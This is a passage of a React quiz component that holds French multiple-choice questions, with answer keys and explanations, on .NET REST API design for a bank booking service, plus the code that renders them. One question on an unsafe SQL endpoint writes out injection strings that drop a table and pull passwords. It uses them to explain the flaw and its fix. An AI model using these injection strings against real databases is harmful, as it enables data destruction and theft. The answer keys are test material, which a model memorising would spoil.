      "answer": "Un `HttpClient` typé pour `ISophisAdapter` avec pipeline de résilience Polly intégré — retry exponentiel + circuit breaker + timeout — via le nouveau `Microsoft.Extensions.Http.Resilience` (.NET 8).",
      "explanation": "`AddHttpClient<ISophisAdapter, SophisHttpAdapter>` : enregistre un `HttpClient` géré (connection pooling, DNS refresh, timeouts) typé sur l'interface. `.AddResilienceHandler` (.NET 8 `Microsoft.Extensions.Http.Resilience`) : pipeline Polly v8 déclaratif attaché à ce client. Avantages vs Polly v7 manuel : `AddRetry`, `AddCircuitBreaker`, `AddTimeout` sont composés dans le bon ordre automatiquement. Le `SophisHttpAdapter` reçoit l'`HttpClient` par injection — il n'a pas à gérer la résilience lui-même. En CIB : Sophis peut être instable pendant les maintenances de nuit — ce pipeline le rend transparent pour l'API de booking."
    },
    {
      "question": "[Thème ↔ Outil] Dans MAPS, quel outil permet de mesurer précisément que le refactoring du service référentiel a réduit les allocations GC de 400MB à 0MB par pricing ?",
      "options": [
        "Azure DevOps build logs — les temps de compilation reflètent les allocations.",
        "BenchmarkDotNet avec le `MemoryDiagnoser` : `[MemoryDiagnoser][Benchmark] public void PriceWithArrayPool()` → colonnes `Gen0`, `Gen1`, `Gen2`, `Allocated` comparent exactement avant/après.",
        "Visual Studio Diagnostic Tools en mode debug — suffisant pour la production.",
        "Les health checks Kubernetes mesurent les allocations GC."
      ],
      "answer": "BenchmarkDotNet avec le `MemoryDiagnoser` : `[MemoryDiagnoser][Benchmark] public void PriceWithArrayPool()` → colonnes `Gen0`, `Gen1`, `Gen2`, `Allocated` comparent exactement avant/après.",
      "explanation": "BenchmarkDotNet avec `[MemoryDiagnoser]` : rapport produit exactement `Gen0 collections`, `Gen1 collections`, `Gen2 collections`, `Allocated` (bytes total). `PriceBookSequential` : Gen0=420, Allocated=403MB. `PriceBookWithArrayPool` : Gen0=0, Allocated=120B. Preuve irréfutable du gain pour la code review et la documentation de la mission. Intégration CI : `dotnet run -c Release --project Benchmarks` + assertion sur `Allocated < threshold`. Visual Studio Diagnostic Tools = interactif/dev, pas reproductible en CI. Azure DevOps = logs de build, pas de métriques mémoire runtime."
    },
    {
      "question": "[Multi-concepts] Dans le pipeline `HTTP Request → JWT Middleware → Rate Limiter → Controller → IBookingService → IIsinService → ISophisAdapter → IMessageBus (RabbitMQ) → SQL Audit`, identifiez les 5 patterns d'architecture.",
      "options": [
        "CRUD + REST + SQL + Docker + CI/CD",
        "Pipeline middleware (chain of responsibility) + Dependency Injection (interfaces injectées) + Cache-aside (ISIN) + Circuit Breaker (Sophis) + Event-Driven Architecture (RabbitMQ publish)",
        "Singleton + Factory + Observer + Builder + Facade",
        "MVC + Repository + Specification + CQRS + Event Sourcing"
      ],
      "answer": "Pipeline middleware (chain of responsibility) + Dependency Injection (interfaces injectées) + Cache-aside (ISIN) + Circuit Breaker (Sophis) + Event-Driven Architecture (RabbitMQ publish)",
      "explanation": "Analyse du flux booking MAPS : Pipeline middleware = les middlewares sont une chain of responsibility — JWT, rate limiter, routing s'exécutent en séquence, chacun pouvant court-circuiter. DI = toutes les dépendances (`IBookingService`, `IIsinService`, `ISophisAdapter`, `IMessageBus`) injectées par constructeur. Cache-aside = `IIsinService` vérifie Redis/MemoryCache avant d'appeler Sophis. Circuit breaker Polly = `ISophisAdapter` protégé contre les pannes Sophis. EDA = `IMessageBus.PublishAsync(\"trade.booked\", event)` découple le booking de ses consommateurs (blotter, RMS, PMS)."
    },
    {
      "question": "[Erreur contextuelle + MiFID II] Un service MAPS log les erreurs avec `_logger.LogError(ex.Message)` uniquement, sans `userId`, `tradeId`, `isin` ni timestamp structuré. Quelle violation ?",
      "options": [
        "Aucune — les logs d'erreurs n'ont pas d'exigences réglementaires.",
        "Violation MiFID II article 25 (traçabilité) + impossibilité d'audit en cas de litige. Correction : `_logger.LogError(ex, \"BookingFailed {TradeId} {ISIN} {UserId} {Desk} {Notional}\", tradeId, isin, userId, desk, notional)` — structured logging avec toutes les dimensions métier.",
        "La seule violation est une mauvaise pratique de développement sans impact réglementaire.",
        "Il faut utiliser `Console.WriteLine` à la place de `_logger`."
      ],
      "answer": "Violation MiFID II article 25 (traçabilité) + impossibilité d'audit en cas de litige. Correction : `_logger.LogError(ex, \"BookingFailed {TradeId} {ISIN} {UserId} {Desk} {Notional}\", tradeId, isin, userId, desk, notional)` — structured logging avec toutes les dimensions métier.",
      "explanation": "MiFID II impose : chaque trade (réussi ou échoué) doit être tracé avec identité du trader, instrument, horodatage, quantité, desk — pendant 5 ans. Un log `LogError(ex.Message)` sans contexte : si le régulateur AMF demande l'audit d'un trade suspect 3 ans plus tard, impossible de retrouver qui a booké quoi. Structured logging Serilog : `{TradeId}`, `{ISIN}`, `{UserId}` deviennent des propriétés indexées dans Elasticsearch/Splunk — requête `tradeId=abc-123` retrouve en secondes tous les événements liés. `LogError(ex, template, ...)` (avec la `Exception` en 1er argument) capture aussi la stack trace."
    },
    {
      "question": "[Ordre de dépendance] Dans l'infrastructure MAPS Docker Compose, quel est l'ordre correct de démarrage des services pour éviter les échecs au lancement ?",
      "options": [
        "L'ordre ne compte pas — `depends_on` suffit.",
        "`SQL Server → Redis → RabbitMQ → SophisAdapter → BookingApi`. Mais `depends_on` ne garantit que le démarrage du container, pas la disponibilité du service — ajouter des health checks wait conditions : `depends_on: sql-server: condition: service_healthy`.",
        "Démarrer tous les services simultanément et laisser les retry Polly gérer.",
        "Démarrer uniquement `BookingApi` — les autres services démarrent automatiquement."
      ],
      "answer": "`SQL Server → Redis → RabbitMQ → SophisAdapter → BookingApi`. Mais `depends_on` ne garantit que le démarrage du container, pas la disponibilité du service — ajouter des health checks wait conditions : `depends_on: sql-server: condition: service_healthy`.",
      "explanation": "Ordre de dépendance Docker Compose : SQL Server doit être prêt (migrations EF Core au démarrage de `BookingApi`). Redis doit être disponible (cache warming `IHostedService`). RabbitMQ doit être connecté (`RabbitMqConsumerService` démarre avec l'application). `SophisAdapter` doit répondre (health check `/health/ready` du `BookingApi` inclut Sophis). `depends_on` sans condition = le container est démarré mais SQL Server n'est peut-être pas encore prêt à accepter des connexions. Solution : `healthcheck` sur chaque service + `condition: service_healthy` dans `depends_on`. En prod Kubernetes : readiness probes jouent ce rôle."
    },
    {
      "question": "[Refactoring + Architecture] Un `BookingService` 500 lignes gère : validation des inputs, résolution ISIN (Sophis), vérification de limites (RMS), création du trade (SQL), publication de l'événement (RabbitMQ) et logging. Refactorisez.",
      "options": [
        "Déplacer le code dans des méthodes privées du même service.",
        "SRP : extraire `IIsinResolver`, `IRmsLimitChecker`, `ITradeRepository`, `IEventPublisher`. `BookingService` orchestre uniquement (20 lignes). DIP : toutes injectées par constructeur. Chaque classe testée indépendamment via mock.",
        "Créer 5 contrôleurs séparés, un par responsabilité.",
        "Utiliser des annotations AOP (PostSharp) pour externaliser la logique."
      ],
      "answer": "SRP : extraire `IIsinResolver`, `IRmsLimitChecker`, `ITradeRepository`, `IEventPublisher`. `BookingService` orchestre uniquement (20 lignes). DIP : toutes injectées par constructeur. Chaque classe testée indépendamment via mock.",
      "explanation": "SRP + DIP sur `BookingService` : avant = 5 responsabilités = 5 raisons de changer = fragile. Après : `BookingService.BookAsync` → `await _isinResolver.ResolveAsync(request.InstrumentId, ct)` → `await _rmsChecker.CheckLimitsAsync(isin, request.Notional, ct)` → `await _tradeRepo.CreateAsync(trade, ct)` → `await _eventPublisher.PublishAsync(\"trade.booked\", event, ct)`. Chaque service est testable isolément avec `Mock<IIsinResolver>` etc. Si Sophis change d'API, seul `SophisIsinResolver : IIsinResolver` est modifié — `BookingService` inchangé. La mission 'refactoring du code' vise exactement cet objectif."
    },
    {
      "question": "[Thème ↔ Concept] Comment le principe `async/await` avec `CancellationToken` améliore-t-il la scalabilité de l'API MAPS sous charge (500 req/sec simultanées) ?",
      "options": [
        "Il utilise plusieurs threads simultanément pour traiter les requêtes.",
        "`async/await` libère le thread HTTP pendant l'I/O (appels Sophis 150ms, SQL 5ms, Redis 2ms). Kestrel peut servir des milliers de requêtes concurrentes avec quelques dizaines de threads — le thread n'est occupé que pendant le calcul CPU, pas l'attente.",
        "Il double la quantité de RAM disponible pour l'API.",
        "Il permet à plusieurs requêtes de partager le même thread CPU."
      ],
      "answer": "`async/await` libère le thread HTTP pendant l'I/O (appels Sophis 150ms, SQL 5ms, Redis 2ms). Kestrel peut servir des milliers de requêtes concurrentes avec quelques dizaines de threads — le thread n'est occupé que pendant le calcul CPU, pas l'attente.",
      "explanation": "Modèle de concurrence ASP.NET Core : sans `async`, chaque requête monopolise un thread pendant toute sa durée (y compris l'attente I/O). 500 req/sec × 150ms Sophis = 75 threads bloqués en permanence. Avec `async/await` : le thread retourne au pool pendant `await _sophisAdapter.GetISINAsync()`. Kestrel reassigne ce thread à d'autres requêtes. En régime, 16 threads CPU peuvent gérer des milliers de connexions I/O-bound concurrentes. `CancellationToken` complète : si le client ferme sa connexion pendant l'attente Sophis, l'appel est annulé immédiatement — libération des ressources."
    }
  ],
  expert: [
    {
      "question": "[Architecture complète] Concevez le pipeline complet d'un `POST /api/v1/booking` dans MAPS depuis le réseau jusqu'à la réponse HTTP, en identifiant chaque composant et son rôle.",
      "options": [
        "Client → SQL Server → Sophis → RabbitMQ → Client",
        "Client HTTPS → YARP/API Gateway (JWT + rate limit) → `BookingController` ([Authorize][ApiController]) → FluentValidation → `BookingService` → `IIsinResolver` (Redis L1/L2→Sophis) → `IRmsChecker` (limites) → `ITradeRepository` (EF Core + SQL transaction) → `IEventPublisher` (RabbitMQ `trade.booked`) → Structured log (Serilog+correlation) → 201 Created + `Location` header.",
        "Client → Nginx → IIS → .NET 4.8 → SQL → Email confirmation",
        "Client → Docker → Kubernetes → Azure → SQL Server → Response"
      ],
      "answer": "Client HTTPS → YARP/API Gateway (JWT + rate limit) → `BookingController` ([Authorize][ApiController]) → FluentValidation → `BookingService` → `IIsinResolver` (Redis L1/L2→Sophis) → `IRmsChecker` (limites) → `ITradeRepository` (EF Core + SQL transaction) → `IEventPublisher` (RabbitMQ `trade.booked`) → Structured log (Serilog+correlation) → 201 Created + `Location` header.",
      "explanation": "Flux complet du booking MAPS : (1) YARP valide le JWT et applique le rate limiter avant même que la requête atteigne le service. (2) `[ApiController]` valide le body JSON automatiquement. (3) FluentValidation vérifie les règles métier (Strike > 0, ISIN format). (4) Cache multi-niveaux résout l'ISIN en < 1ms (95%+ hit). (5) EF Core + transaction SQL garantit l'atomicité booking+audit. (6) RabbitMQ découple le booking de ses downstream (blotter, RMS). (7) Serilog enrichit avec `{TradeId}`, `{UserId}`, `{ISIN}` — MiFID II. (8) 201 Created + `Location: /api/v1/booking/{tradeId}` — REST correct."
    },
    {
      "question": "[Nommage inversé] Un pattern garantit qu'une `VolatilitySurface` partiellement recalibrée n'est jamais observée par les threads de pricing parallèles, sans aucun verrou, avec un impact mémoire minimal.",
      "options": [
        "Double-checked locking avec `lock` sur la référence de surface",
        "Immutable Object + swap atomique `Interlocked.Exchange(ref _surface, newSurface)` — la nouvelle surface est construite entièrement en privé, swappée atomiquement. Les threads actifs gardent leur référence locale cohérente jusqu'à leur prochain appel.",
        "ReadWriteLockSlim avec upgrade lock pour la recalibration",
        "Copy-on-write : chaque thread travaille sur une copie de la surface"
      ],
      "answer": "Immutable Object + swap atomique `Interlocked.Exchange(ref _surface, newSurface)` — la nouvelle surface est construite entièrement en privé, swappée atomiquement. Les threads actifs gardent leur référence locale cohérente jusqu'à leur prochain appel.",
      "explanation": "Pattern fondamental pour les données partagées read-heavy en CIB : `private volatile VolatilitySurface _currentSurface`. Recalibration : `var newSurface = BuildSurface(calibratedGrid)` — objet complet et cohérent construit privément. `var old = Interlocked.Exchange(ref _currentSurface, newSurface)` — swap atomique, < 1ns. Threads pricing : `var surface = _currentSurface` — capturent la référence atomiquement. Si la recalibration s'effectue pendant un calcul, le thread garde la surface cohérente qu'il a capturée. Aucun lock = aucune contention = scalabilité parfaite. `volatile` garantit la visibilité cross-thread de la référence. Vs `ReaderWriterLockSlim` : performances identiques en read, mais zéro lock acquire/release overhead."
    },
    {
      "question": "[Multi-concepts + Infrastructure] Décrivez l'infrastructure complète de MAPS pour supporter 1000 req/sec de pricing avec 99.9% de disponibilité, en nommant chaque composant et son rôle.",
      "options": [
        "Un seul serveur Windows IIS avec SQL Server local.",
        "Kubernetes (2→20 pods HPA) + YARP API Gateway (JWT, rate limit, load balancing) + Redis Cluster (cache ISIN + rate limit) + SQL Server primary/replica (booking writes / reads) + RabbitMQ Cluster (messaging + DLQ) + Prometheus/Grafana (métriques/alertes) + Azure DevOps (CI/CD) + Docker (containerisation) + `Channel<T>` bounded (backpressure interne).",
        "Azure Functions + CosmosDB + Service Bus + Application Insights.",
        "3 VM Windows IIS + SQL Server AlwaysOn + MSMQ."
      ],
      "answer": "Kubernetes (2→20 pods HPA) + YARP API Gateway (JWT, rate limit, load balancing) + Redis Cluster (cache ISIN + rate limit) + SQL Server primary/replica (booking writes / reads) + RabbitMQ Cluster (messaging + DLQ) + Prometheus/Grafana (métriques/alertes) + Azure DevOps (CI/CD) + Docker (containerisation) + `Channel<T>` bounded (backpressure interne).",
      "explanation": "Architecture HA pour MAPS : Kubernetes HPA = scale sur métriques Prometheus (latence P99 > 200ms → ajouter pods). YARP = point d'entrée unique, valide JWT une fois pour tous les microservices. Redis Cluster = consistent hashing sur 3 nœuds, réplication cross-AZ, cache ISIN + compteurs rate limit distribués. SQL primary/replica = écriture sur primary (booking EF Core), lecture sur replica (queries référentiel Dapper). RabbitMQ Cluster = 3 nœuds, quorum queues (pas de perte de message), DLQ pour les rejets. Channel<T> bounded = backpressure interne par pod, absorbe les microburst. 99.9% SLA = max 8h45 downtime/an — chaque composant a un failover."
    },
    {
      "question": "[Erreur + Architecture] L'API MAPS expose `GET /api/v1/instruments?sql=SELECT * FROM Instruments WHERE {userInput}` et exécute dynamiquement la requête SQL. Diagnostiquez toutes les vulnérabilités et proposez l'architecture correcte.",
      "options": [
        "Acceptable si le compte SQL est en read-only.",
        "SQL Injection totale (même en read-only : `; DROP TABLE Instruments --`, exfiltration de tables non autorisées) + pas de pagination (résultat non borné) + pas d'autorisation par données + logging du SQL dans les access logs (fuite). Correction : paramètres typés `?underlyingId=BNPP&type=Call&maturityFrom=...` + LINQ/Dapper paramétré + pagination obligatoire + Specification pattern.",
        "Le seul risque est une dégradation des performances avec des requêtes complexes.",
        "Ajouter `[Authorize]` sur l'endpoint suffit à prévenir l'injection SQL."
      ],
      "answer": "SQL Injection totale (même en read-only : `; DROP TABLE Instruments --`, exfiltration de tables non autorisées) + pas de pagination (résultat non borné) + pas d'autorisation par données + logging du SQL dans les access logs (fuite). Correction : paramètres typés `?underlyingId=BNPP&type=Call&maturityFrom=...` + LINQ/Dapper paramétré + pagination obligatoire + Specification pattern.",
      "explanation": "Vulnérabilités cumulées : (1) SQL injection : même en read-only, `UNION SELECT password FROM Users` exfiltre d'autres tables. Exécution multi-statements si MARS activé. (2) `SELECT *` sans pagination : `SELECT * FROM Instruments` = 500k lignes, OutOfMemoryException. (3) Autorisation par données : un trader equity peut voir les instruments du desk taux. (4) Log pollution : le SQL brut apparaît dans les access logs → fuite de la structure de la base. Architecture correcte : `IInstrumentQuerySpec { UnderlyingId, InstrumentType, MaturityRange, Page, PageSize }` → LINQ IQueryable → Dapper paramétré. Jamais d'input utilisateur dans une chaîne SQL."
    },
    {
      "question": "[Ordre de dépendance + Mission] Pour la mission 'mise en place d'un nouveau service de booking via REST API', quel est l'ordre de développement optimal garantissant qualité et conformité réglementaire ?",
      "options": [
        "Code → Tests → Documentation → Déploiement",
        "1. Contrat OpenAPI (Swagger) → 2. Tests unitaires (interfaces mockées, TDD) → 3. Logique métier + interfaces → 4. Implémentations (Sophis, SQL, RabbitMQ) → 5. Tests d'intégration (Testcontainers) → 6. Sécurité JWT + policies + validation → 7. Structured logging MiFID II → 8. Health checks + métriques Prometheus → 9. Dockerfile multi-stage → 10. Pipeline Azure DevOps → 11. UAT + smoke tests.",
        "1. Base de données → 2. API → 3. Tests → 4. Sécurité → 5. Docker",
        "1. Docker → 2. Kubernetes → 3. CI/CD → 4. Code → 5. Tests"
      ],
      "answer": "1. Contrat OpenAPI (Swagger) → 2. Tests unitaires (interfaces mockées, TDD) → 3. Logique métier + interfaces → 4. Implémentations (Sophis, SQL, RabbitMQ) → 5. Tests d'intégration (Testcontainers) → 6. Sécurité JWT + policies + validation → 7. Structured logging MiFID II → 8. Health checks + métriques Prometheus → 9. Dockerfile multi-stage → 10. Pipeline Azure DevOps → 11. UAT + smoke tests.",
      "explanation": "Ordre optimal pour la mission MAPS : Contrat OpenAPI first = l'OMS peut développer le client en parallèle contre le contrat. TDD = les tests définissent le comportement attendu avant le code → les interfaces émergent naturellement. Implémentations après les interfaces = Sophis/SQL/RabbitMQ sont interchangeables. Sécurité avant les tests d'intégration = pas de régression de sécurité possible. Logging MiFID II avant mise en production = non-négociable réglementairement. Health checks avant Docker = le container sait quand il est prêt. CI/CD en dernier = automatisation d'un processus déjà validé. Sans cet ordre : la sécurité est souvent ajoutée en dernier (risque), les logs MiFID II manquent au premier déploiement."
    },
    {
      "question": "[Nommage inversé + .NET] Un mécanisme .NET permet d'allouer un tableau sur la stack au lieu du heap, limitant son impact au GC, utilisable uniquement pour de petits arrays de taille connue au compile time. Quel est-il ?",
      "options": [
        "`ArrayPool<T>.Shared.Rent(n)` — pool partagé",
        "`stackalloc T[n]` retourné dans un `Span<T>` — allocation stack sans aucune pression GC, libéré à la sortie de scope. Limité aux types non-managés et aux petites tailles (stack ~1MB).",
        "`new T[n]` avec `GC.SuppressFinalize` pour éviter la collection",
        "`Memory<T>` sur le heap managé sans GC pressure"
      ],
      "answer": "`stackalloc T[n]` retourné dans un `Span<T>` — allocation stack sans aucune pression GC, libéré à la sortie de scope. Limité aux types non-managés et aux petites tailles (stack ~1MB).",
      "explanation": "Dans MAPS pour les micro-calculs : `Span<double> path = stackalloc double[252]` — 252 doubles = 2016 bytes sur la stack, libérés à la fermeture du scope (fin de la méthode). Zéro allocation heap, zéro GC. Limites : types non-managés uniquement (`double`, `decimal`, `int`, structs sans références). Taille fixe connue au compile time. Stack limitée (~1MB) — ne pas dépasser quelques KB. Usage dans MAPS : parsing d'ISIN (`Span<char> isinSpan = stackalloc char[12]`), calculs de Greeks locaux. Pour les grands tableaux (100k doubles Monte Carlo) : `ArrayPool`. Pour les tableaux moyens (252 doubles par chemin) dans une méthode courte : `stackalloc`."
    },
    {
      "question": "[Situation → Multi-concepts] Le pipeline CI/CD Azure DevOps de MAPS doit gérer deux branches : `feature/booking-rest-api` (développement) et `release/v2` (production). Décrivez les différences de pipeline et les gates.",
      "options": [
        "Les deux branches utilisent le même pipeline identique.",
        "Feature branch : build + tests unitaires + code coverage > 80% + SonarQube. Release branch : feature pipeline + tests d'intégration (Testcontainers) + docker build/push → ACR + déploiement UAT + smoke tests + gate approbation manuelle (Risk IT + Compliance) + déploiement prod + rollback automatique si health check échoue.",
        "Feature branch : déploiement direct en production. Release : tests uniquement.",
        "Un seul pipeline sans distinction de branches est suffisant."
      ],
      "answer": "Feature branch : build + tests unitaires + code coverage > 80% + SonarQube. Release branch : feature pipeline + tests d'intégration (Testcontainers) + docker build/push → ACR + déploiement UAT + smoke tests + gate approbation manuelle (Risk IT + Compliance) + déploiement prod + rollback automatique si health check échoue.",
      "explanation": "Pipelines différenciés en CIB : feature branches = feedback rapide pour le développeur (< 5min). La gate SonarQube (code quality) bloque les PRs avec vulnérabilités. Release branches = pipeline complet avec Testcontainers (SQL Server + RabbitMQ réels), docker multi-stage, push ACR (Azure Container Registry). Gate manuelle obligatoire en CIB : le déploiement en production d'un service de booking nécessite l'approbation Risk IT (impact sur les limites) et Compliance (MiFID II). Rollback automatique : si `GET /health/ready` échoue 3 fois après déploiement, Kubernetes revient à l'image précédente — conformité SOX (ségrégation des rôles, traçabilité des déploiements)."
    }
  ]
};

const renderInlineTokens = (text, keyPrefix) => {
  const regex = /(\*\*.*?\*\*|`.*?`|\*.*?\*)/g;
  const parts = text.split(regex);
  return parts.map((part, idx) => {
    if (part.startsWith("**") && part.endsWith("**")) {
      return <strong key={`${keyPrefix}-${idx}`} style={{ display: 'inline', fontWeight: 'bold' }}>{part.slice(2, -2)}</strong>;
    }
    if (part.startsWith("`") && part.endsWith("`")) {
      return (
        <code key={`${keyPrefix}-${idx}`} style={{
          display: 'inline', backgroundColor: '#eef2f7', padding: '1px 5px',
          borderRadius: '3px', fontFamily: 'monospace', color: '#e01e5a',
          fontWeight: 'bold', fontSize: '13px'
        }}>
          {part.slice(1, -1)}
        </code>
      );
    }
    if (part.startsWith("*") && part.endsWith("*")) {
      return <em key={`${keyPrefix}-${idx}`} style={{ display: 'inline' }}>{part.slice(1, -1)}</em>;
    }
    return part;
  });
};

const renderFormattedText = (text) => {
  if (!text) return null;
  let cleanText = text
    .replace(/\r?\n- /g, " ◆ ").replace(/\r?\n• /g, " ◆ ").replace(/\r?\n/g, " ")
    .replace(/\.-\s*\*\*/g, " ◆ **").replace(/-\s*\*\*/g, " ◆ **");
  if (cleanText.startsWith(" ◆ ")) cleanText = cleanText.substring(3);
  if (cleanText.startsWith("- ")) cleanText = cleanText.substring(2);
  const segments = cleanText.split(" ◆ ");
  return (
    <span style={{ display: 'block', lineHeight: '1.7' }}>
      {segments.map((segment, segIdx) => (
        <span key={segIdx} style={{ display: 'block', marginBottom: segIdx < segments.length - 1 ? '6px' : '0' }}>
          {segIdx > 0 && <span style={{ color: '#1a73e8', fontWeight: 'bold', marginRight: '5px' }}>◆</span>}
          {renderInlineTokens(segment, `seg-${segIdx}`)}
        </span>
      ))}
    </span>
  );
};

const Timer = ({ timeLeft }) => <p className="timer">⏳ <span>{timeLeft}s</span></p>;

const QuestionCard = ({ question, options, onAnswerClick, timeLeft }) => (
  <div className="question-card">
    <h4>💡 {question}</h4>
    <Timer timeLeft={timeLeft} />
    <div className="options-container">
      {options.map((option, index) => (
        <button key={index} onClick={() => onAnswerClick(option)} className="option-button">
          {String.fromCharCode(65 + index)}. {option}
        </button>
      ))}
    </div>
  </div>
);

const Flashcard = ({ slide }) => (
  <div className="question-card" style={{ fontSize: '14px', margin: '0' }}>
    <p style={{ fontWeight: 'bold', fontSize: '15px', color: '#1a73e8', margin: '0 0 10px 0' }}>{slide.question}</p>
    <div style={{ padding: '12px 15px', background: '#f8f9fa', borderRadius: '8px', borderLeft: '4px solid #1a73e8', textAlign: 'left' }}>
      {renderFormattedText(slide.answer)}
    </div>
  </div>
);

const Results = ({ scores }) => {
  const totalScore = scores.moyen + scores.avance + scores.expert;
  const totalQuestions = questions.moyen.length + questions.avance.length + questions.expert.length;
  return (
    <div className="results">
      <h3>🎯 Score : {totalScore} / {totalQuestions}</h3>
      <p>✅ Moyen : {scores.moyen}/{questions.moyen.length} | ✅ Avancé : {scores.avance}/{questions.avance.length} | ✅ Expert : {scores.expert}/{questions.expert.length}</p>
      {totalScore >= Math.floor(totalQuestions * 0.6)
        ? <h3 className="success">🚀 Infrastructure REST API CIB maîtrisée — Mission MAPS prête !</h3>
        : <p className="fail">📚 Révisez l'API REST, le multithreading C# et l'architecture microservices CIB.</p>}
    </div>
  );
};

const CIBRestApiInfraQCM = () => {
  const [level, setLevel] = useState("basic");
  const [currentSlide, setCurrentSlide] = useState(0);
  const [currentQuestion, setCurrentQuestion] = useState(0);
  const [scores, setScores] = useState({ moyen: 0, avance: 0, expert: 0 });
  const [timeLeft, setTimeLeft] = useState(25);
  const [showResult, setShowResult] = useState(false);
  const [message, setMessage] = useState("");

  const handleNextQuestion = () => {
    const qs = questions[level];
    if (currentQuestion + 1 < qs.length) { setCurrentQuestion(q => q + 1); setTimeLeft(25); setMessage(""); }
    else {
      if (level === "moyen") setLevel("avance");
      else if (level === "avance") setLevel("expert");
      else setShowResult(true);
      setCurrentQuestion(0); setTimeLeft(25); setMessage("");
    }
  };

  useEffect(() => {
    if (level !== "basic" && !showResult) {
      if (timeLeft > 0) { const t = setTimeout(() => setTimeLeft(t2 => t2 - 1), 1000); return () => clearTimeout(t); }
      else handleNextQuestion();
    }
  }, [timeLeft, level, showResult]);

  useEffect(() => {
    if (level === "basic" && !showResult) {
      const i = setInterval(() => {
        setCurrentSlide(prev => {
          if (prev + 1 < basicSlides.length) return prev + 1;
          setLevel("moyen"); setCurrentQuestion(0); setTimeLeft(25); return 0;
        });
      }, 20000);
      return () => clearInterval(i);
    }
  }, [level, showResult]);

  const handleAnswerClick = (option) => {
    const current = questions[level][currentQuestion];
    if (option === current.answer) { setScores(p => ({ ...p, [level]: p[level] + 1 })); setMessage("✅ Correct !"); }
    else { setMessage(`❌ ${current.answer}\n\nℹ️ ${current.explanation}`); }
    setTimeout(handleNextQuestion, 4000);
  };

  return (
    <div className="qcm-container">
      {showResult ? <Results scores={scores} /> : (
        <div>
          <h4 className="subtitle" style={{ fontSize: '10px', margin: '0 0 6px 0' }}>
            CIB REST API & Infrastructure 🔹 {level === "basic"
              ? `Slide ${currentSlide + 1}/${basicSlides.length}`
              : `QCM ${level.toUpperCase()} — Q${currentQuestion + 1}/${questions[level].length}`}
          </h4>
          {level === "basic"
            ? <Flashcard slide={basicSlides[currentSlide]} />
            : <QuestionCard question={questions[level][currentQuestion].question} options={questions[level][currentQuestion].options} onAnswerClick={handleAnswerClick} timeLeft={timeLeft} />}
          {message && <p className="message" style={{ whiteSpace: 'pre-wrap', marginTop: '8px' }}>{message}</p>}
        </div>
      )}
    </div>
  );
};

export default CIBRestApiInfraQCM;
